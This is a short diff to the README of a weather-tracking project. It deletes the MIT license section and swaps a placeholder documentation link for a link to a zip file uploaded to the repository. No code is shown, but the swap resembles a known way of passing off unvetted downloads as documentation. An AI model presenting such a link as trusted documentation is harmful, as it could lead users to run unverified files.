@@ -9,14 +9,10 @@ This project is focused on providing users with a straightforward and focused we
 ![Logo](https://github.com/Vedant2004X/WeatherTracker/assets/142646048/e07a4923-c7e0-46ad-ab0a-9f5ea827e190.png)
 
 
-## License
-
-[MIT](https://choosealicense.com/licenses/mit/)
-
 
 ## Documentation
 
-[Documentation](https://linktodocumentation)
+[WeatherTracker.zip](https://github.com/Vedant2004X/WeatherTracker/files/14395477/WeatherTracker.zip)
 
 
 ## Tech Stack
